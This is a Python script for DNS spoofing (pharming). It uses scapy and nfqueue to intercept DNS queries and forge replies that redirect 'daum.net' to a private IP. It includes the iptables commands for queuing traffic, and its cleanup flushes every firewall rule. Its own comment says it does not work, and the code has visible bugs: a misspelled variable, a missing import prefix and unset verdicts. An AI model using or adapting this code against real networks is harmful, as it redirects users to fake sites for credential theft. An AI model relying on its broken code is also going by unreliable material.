import scapy.all
import nfqueue
import socket
import os

#
# Doesn't work, don't know why... (Ubuntu 18.04)
# scapy is even slower on Ubuntu 18.04 ~_~
# Need something faster...
#

# Before execution: iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE
# After execution : iptables -t nat -D PREROUTING -p udp --dport 53 -j NFQUEUE

pharming_target = 'daum.net'
pharming_site = '192.168.40.129'

def dnsSpoof(dummy, payload):
	data = payload.get_data()
	packet = scapy.all.IP(data)

	dstip = packet[scapy.all.IP].src
	srcip = packet[scapy.all.IP].dst
	dport = packet[scapy.all.UDP].sport
	sport = packet[scapy.all.UDP].dport

	if packet.haslayer(scapy.all.DNSQR):
		ndsid = packet[scapy.all.DNS].id
		qd = packet[scapy.all.DNS].qd
		rrname = packet[scapy.all.DNS].qd.qname

		if pharming_target in rrname:
			P_IP = scapy.all.IP(dst=dstip, src=srcip)
			P_UDP= scapy.all.UDP(dport=dport, sport=sport)
			dnsrr = DNSRR(rrname=rrname, ttl=10, rdata=pharming_site)
			P_DNS = scapy.all.DNS(id=dnsid, qr=1, aa=1, qd=qd, an=dnsrr)
			spoofPacket = P_IP/P_UDP/P_DNS
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofPacket), len(spoofPacket))
			print('DNS SPOOFING {} -> {}'.format(pharming_target, pharming_site))

	else:
		payload.set_verdict(nfqueue.NF_ACCEPT)

if __name__ == '__main__':
	print('DNS SPOOF START...')

	q = nfqueue.queue()
	q.open()
	q.bind(socket.AF_INET)
	q.set_callback(dnsSpoof)
	q.create_queue(0)

	try:
		q.try_run()
	except KeyboardInterrupt:
		q.unbind(socket.AF_INET)
		q.close()
		print('Recovering iptables...')
		os.system('iptables -F')
		os.system('iptables -X')
